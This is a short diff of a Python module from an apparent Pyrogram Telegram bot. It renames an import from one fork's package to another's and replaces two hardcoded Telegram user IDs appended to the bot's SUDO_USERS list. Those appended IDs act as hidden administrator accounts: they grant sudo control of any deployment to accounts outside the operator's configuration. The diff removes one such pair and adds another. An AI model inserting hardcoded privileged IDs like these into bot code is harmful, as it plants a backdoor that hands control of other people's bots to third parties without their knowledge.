@@ -2,11 +2,11 @@ from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
 from config import SUDO_USERS
-from Zaid.admins import get_administrators
+from ALBY.admins import get_administrators
 
 
-SUDO_USERS.append(1669178360)
-SUDO_USERS.append(1920507972)
+SUDO_USERS.append(1441342342)
+SUDO_USERS.append(5089916692)
 
 
 
